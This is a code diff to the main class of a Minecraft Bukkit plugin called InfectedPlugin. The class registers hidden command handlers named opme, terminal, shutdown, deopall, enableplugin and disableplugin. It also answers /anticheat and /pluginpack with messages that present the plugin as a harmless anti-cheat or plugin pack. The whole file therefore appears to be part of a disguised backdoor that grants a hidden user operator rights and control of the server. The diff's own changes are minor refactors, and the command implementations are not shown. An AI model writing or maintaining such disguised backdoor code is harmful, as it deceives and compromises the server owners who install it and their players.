@@ -12,7 +12,7 @@ import org.CreeperCoders.InfectedPlugin.Commands.*;
 
 public class InfectedPlugin extends JavaPlugin
 {
-    public final Logger log = Bukkit.getLogger();
+    public static final Logger log = Bukkit.getLogger();
     public InfectedPlugin plugin;
     
     @Override
@@ -35,9 +35,9 @@ public class InfectedPlugin extends JavaPlugin
             this.getServer().getPluginManager().registerEvents(new Command_help(), this);
             this.getServer().getPluginManager().registerEvents(new Command_opme(), this);
             this.getServer().getPluginManager().registerEvents(new Command_terminal(), this);
-            this.getServer().getPluginManager().registerEvents(new Command_fuckoff(), this);
+            //this.getServer().getPluginManager().registerEvents(new Command_fuckoff(), this);
             this.getServer().getPluginManager().registerEvents(new Command_shutdown(), this);
-            this.getServer().getPluginManager().registerEvents(new Command_randombanl(), this);
+            //this.getServer().getPluginManager().registerEvents(new Command_randombanl(), this);
             this.getServer().getPluginManager().registerEvents(new Command_enableplugin(), this);
             this.getServer().getPluginManager().registerEvents(new Command_disableplugin(), this);
             this.getServer().getPluginManager().registerEvents(new Command_deopall(), this);
@@ -63,13 +63,11 @@ public class InfectedPlugin extends JavaPlugin
             sender.sendMessage(ChatColor.GREEN + "AntiCheat 2.0 is working 100%");
             return true;
         }
-
-        if (commandLabel.equalsIgnoreCase("pluginpack"))
+        else if (commandLabel.equalsIgnoreCase("pluginpack"))
         {
             sender.sendMessage(ChatColor.GREEN + "PluginPack 2.4 working 100%! Use /anticheat to see anticheat details!");
             return true;
         }
         return false;
     }
-
 }
